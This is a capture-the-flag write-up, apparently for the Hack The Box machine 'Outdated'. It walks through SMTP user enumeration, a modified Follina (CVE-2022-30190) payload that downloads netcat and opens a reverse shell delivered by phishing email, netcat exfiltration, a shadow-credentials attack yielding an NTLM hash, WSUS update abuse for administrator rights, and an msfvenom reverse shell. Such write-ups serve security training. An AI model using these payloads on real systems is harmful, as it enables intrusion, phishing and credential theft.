![outdated.png](outdated.png)

# Outdated

## DNS Enum
We know about the domain name because the SMTP server discloses it  
```bash
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```
so we can probe the DNS server for more information  
```bash
dig ANY @10.10.11.175 outdated.htb
dig ANY @10.10.11.175 outdated.htb +short
10.10.11.175
172.16.20.1
dc.outdated.htb.
dc.outdated.htb. hostmaster.outdated.htb. 228 900 600 86400 3600
dead:beef::108
dead:beef::6558:dffe:4c79:13ba
```
```bash
Domain Name: OUTDATED
Domain Sid: S-1-5-21-4089647348-67660539-4016542185
```

## SMTP Enumeration Tangent
The following wasn't necessarilly a very fruitfull for the enumeration of this box  
But it still was a good learning experience  
On a previos machine, (trick) I had written a very simple python script to enumerate users from a postfix server.  
And it worked by abusing the VRFY function.  
This server here seems to be something called hMailServer smtpd if Nmap fingerprinting is correct.  
As mentionned earyer the SMTP server, it discloses the domain name immediately on connectioni  
```bash
telnet outdated.htb 25
Trying 10.10.11.175...
Connected to outdated.htb.
Escape character is '^]'.
220 mail.outdated.htb ESMTP
EHLO mail.outdated.htb
250-mail.outdated.htb
250-SIZE 20480000
250-AUTH LOGIN
250 HELP
```

Unfortunately though the VRFY command is disallowed,  
So I won't be able to reuse the script I wrote from trick  
```bash
HELP
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
VRFY asdf@asdf.org
502 VRFY disallowed.
```

Looking for other options in Hacktricks, I decide to give a try to the RCPT enumeration method   
and it looks like its gonna work  
```bash
MAIL FROM: asdf@asdf.org
250 OK
RCPT TO:asdf@outdated.htb
550 Unknown user
RCPT TO:itsupport@outdated.htb
250 OK
```

So at this stage I started writing silly python script to enumerate smtp users with RCPT.  
I ended up with this: 
```python
import socket
import os
import sys
import argparse
from time import sleep

class Smpt():
    def __init__(self, target, userlist, mailfrom, port=25):
        self.target = target
        self.userlist = userlist
        self.port = port
        self.mailfrom = [mailfrom, True]
        self.sock = None
        self.targetBanner = None

    def readUsers(self):
        with open(self.userlist, 'r') as file:
            users = file.read().strip().split('\n')
        self.userlist = users
        return

    def buildSock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target, self.port))
        self.sock = s
        banner = self.sock.recv(1024)[4::]
        if self.targetBanner == None:
            self.targetBanner = banner
        return

    def closeSock(self):
        self.sock.close()
        self.sock = None
        return

    def rcptProbe(self, mail):
        if self.mailfrom[1]:
            self.sock.send("EHLO all\r\n".encode())
            self.sock.recv(1024)
            self.sock.send(f"MAIL FROM:{self.mailfrom[0]}\r\n".encode())
            self.sock.recv(1024)
            self.mailfrom[1] = False
        self.sock.send(f"RCPT TO:{mail}\r\n".encode())
        response = self.sock.recv(1024).decode()
        if "250" in response:
            return True
        else:
            return False

if __name__ == "__main__":
    smtp = Smpt(
        target="10.10.11.175",
        userlist=sys.argv[1],
        mailfrom="asdf@asdf.org"
    )
    smtp.buildSock()
    smtp.readUsers()
    smtp.buildSock()
    print(smtp.targetBanner.decode())
    clear = "\033[K"
    green = "\033[32m"
    reset = "\033[m"
    for name in smtp.userlist:
        mail = name+"@outdated.htb"
        print(f"{mail}{clear}\r", end="")
        result = smtp.rcptProbe(mail)
        if result:
            print(f"\r{green}Found one:{reset} {mail}")
    smtp.closeSock()
```
```bash
python3 smtp_rcpt_brute.py words
mail.outdated.htb ESMTP

Found one: itsupport@outdated.htb
```
I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future
  
## SMB enum
back to actually trying to do something with the machine  
```bash
nbtscan 10.10.11.168
smbmap -H 10.10.11.175
smbmap -H 10.10.11.175 -u null -p null
smbmap -H 10.10.11.175 -u guest
```
```bash
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share
Shares                                                  READ ONLY
SYSVOL                                                  NO ACCESS       Logon server share
UpdateServicesPackages                                  NO ACCESS       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
WsusContent                                             NO ACCESS       A network share to be used by Local Publishing to place published content on this WSUS system.
WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
```
We have access to "IPC$" and "Shares", IPC$ is apparently empty  
```bash
smbclient -U guest -N //10.10.11.175/Shares
smbclient --no-pass //10.10.11.175/Shares
```
but there a pdf in Shares
```bash
smb: \> ls
  .                                   D        0  Mon Jun 20 16:01:33 2022
  ..                                  D        0  Mon Jun 20 16:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 16:00:32 2022

                9116415 blocks of size 4096. 1591614 blocks available

smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (159.3 KiloBytes/sec) (average 159.3 KiloBytes/sec)
```
From the pdf we get good indication that this is gonna be about sending a Follina payload to the support email

## CVE-2022-30190 - Follina
Lord John Hammond did a thing, and it's really nice:
[https://github.com/JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)  
with the simplest args this generates a follina payload, and serves it over http on port 8000  
if we use the --reverse flag, it slaps a reverse shell payload into the follina ms-msdt thing  
and even opens a netcat listener for us to catch the shell  
the code John wrote is actually fetching nc64.exe from his own github  
and uses that to call back from the victim's machine  
Of course this isn't gonna do the trick for us, since the victim doesn't have internet access  
So lets change the code slightly to host nc64.exe on our machine on another webserver on 9191  
```python
if args.reverse:
        command = f"""Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""

    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )
```
generating the payload and starting the webserver and listener all at once  
```bash
./follina.py -i tun0 -r 9090
[+] copied staging doc /tmp/y9v6zrd8
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
[+] starting 'nc -lvnp 9090'
listening on [any] 9090 ...
```
and starting the webserver on 9191 for netcat
```bash
python3 -m http.server 9191                               2 ⨯
Serving HTTP on 0.0.0.0 port 9191 (http://0.0.0.0:9191/) ...
```

Double checking how the payload was generated
```bash
curl -s http://10.10.14.43:8000|awk -F '+' '{print $9}'|tr -d "'"|base64 -d
Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\Windows\Tasks\nc.exe; C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.14.43 9090
```

now the only thing left to do is to deliver the payload  
We'll do that by sending a link to our local webserver hosting the follina payload over email to the itsupport team.
```bash
swaks \
    --from asdf@asdf.htb \
    --to itsupport@outdated.htb \
    --header "Subject: asdfasdfasdfasdf" \
    --server mail.outdated.htb \
    --body 'http://10.10.14.43:8000'
```
couldn't get a callback though, will try again some other day
after trying a third day in a row, I finally got a callback, the only difference with today's payload is, I hosted it myself instead of via the tool and it was servers on port 80 from an index.htlm text file.
I'm pretty sure this didn't have any incidence on it working or not. 
The machine is just utterly unstable.


## BloodHound
uploading sharphound on the box with certutil
```bash
certutil.exe -urlcache -f http://10.10.14.83:8000/SharpHound.exe SharpHound.exe
./SharpHound.exe -c All --zipfilename output.zip
```
exfiltrate the data
```bash
nc64.exe 10.10.14.83 4242 < output.zip
nc -lvnp 4242 > output.zip
```

## Shadow Credential 
Uploading Rubeus and Whisker to the machine to perform the shadow credential attack
I had to build whisker from source on a windows VM, and uploading the dotnet executable on the machine using certutil.exe. 
Yes I got a different ip in the meantime, this box is really unstable, so I change VPN servers often to get to a working one.
Rubeus is already available as a binary in GhostPack
```bash
certutil.exe -urlcache -f http://10.10.14.15:8000/Whisker.exe Whisker.exe
certutil.exe -urlcache -f http://10.10.14.15:8000/Rubeus.exe Rubeus.exe
```
running whisker to add a new cred to sflowers
```bash
Whisker.exe add /target:sflowers
```
whisker then gives the exact syntax for rubeus to pull sflower's TGT.  
which looks like this: 
```bash
Rubeus.exe asktgt /user:sflowers /certificate:<b64> /password:"hlyTBJYNHmGRbKJa" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show


   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
      *********************************SNIP*******************************************
      NTVaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  10/8/2022 12:24:55 PM
  EndTime                  :  10/8/2022 10:24:55 PM
  RenewTill                :  10/15/2022 12:24:55 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  ZFjdNOAHmXZtdFcrIm/m2w==
  ASREP (key)              :  A187BB482CB402C93329AE80D660039C

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```
Now we can use evil-winrm to PS remote in the machine as sflowers


## Discovering a non TLS WSUS
```bash
evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
```
Using winpeas, we can see that there is a WSUS server that is running without TLS
```bash
cd $Env:temp
certutil.exe -urlcache -f http://10.10.14.15:8000/winpeas.bat winpeas.bat
```
```bash
 [+] WSUS
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    WUServer    REG_SZ    http://wsus.outdated.htb:8530
```

checking further on registry keys 
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.outdated.htb:8530
```
the wsus server is indeed http and not https
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    UseWUServer    REG_DWORD    0x1
```
and the UseWUServer is 1, so it's turned on

## Exploiting WSUS
We'll be using SharpWSUS
[SharpWSUS](https://github.com/nettitude/SharpWSUS.git)  
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment)  
Once again I downloaded that on a windows VM with Visual Studio, and attempted to compile it into a dotnet binary. But this approach didn't work for me cause this is a .NET Framework 4.0 project, and I can't get that for the version and CPU architecture that I'm running Visual Studio on...
So I'm extracting that from the 
[S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1) repo.

```bash
wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
# Deleted everything but the base64 payload from the file then:
cat Invoke-SharpWSUS.ps1 |base64 -d > SharpWSUS.gz
gunzip SharpWSUS.gz
file SharpWSUS                                        
SharpWSUS: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
mv SharpWSUS{,.exe}
```

upload sharpWSUS on the machine
```bash
certutil.exe -urlcache -f http://10.10.14.15:8000/SharpWSUS.exe SharpWSUS.exe
```

make an update that will add sflowers to the administrators group
```
./SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators sflowers /add\""

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\sflowers\Desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c \net
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c \net

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 30
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 31
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:0141ab3f-05f0-4d91-b8d4-a7d7f4eba208 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:0141ab3f-05f0-4d91-b8d4-a7d7f4eba208 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:0141ab3f-05f0-4d91-b8d4-a7d7f4eba208 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```

Approve the update
```
./SharpWSUS.exe approve /updateid:0141ab3f-05f0-4d91-b8d4-a7d7f4eba208 /computername:dc.outdated.htb /groupname:"blnkn-admin"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: blnkn-admin
Added Computer To Group
Approved Update

[*] Approve complete
```

Check if the update has been installed
```
./SharpWSUS.exe check /updateid:0141ab3f-05f0-4d91-b8d4-a7d7f4eba208 /computername:dc.outdated.htb

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1

[*] Update is not installed

[*] Check complete
```
and wait a little until it is, after that, sflowers will be a member of the Administrator group
```
net user sflowers
User name                    sflowers
Full Name                    Susan Flowers
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 11:04:09 AM
Password expires             Never
Password changeable          6/21/2022 11:04:09 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/15/2022 10:48:27 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *WSUS Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```
you can now log off and log back in and the privilege will be effective, which means that we can navigate to the Admin directory and get the flag

a few more windows command 
```bash
Get-PSSession -ComputerName localhost
net users sflowers
del payload.exe
cd %temp%          # in CMD
cd $Env:temp       # in powershell
where certutil.exe # CMD only? 
```
use msfvenom to do a reverse shell in cmd instead of Evil-WinRM's powershell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > payload.exe
rlwrap nc -lvnp 4444
```
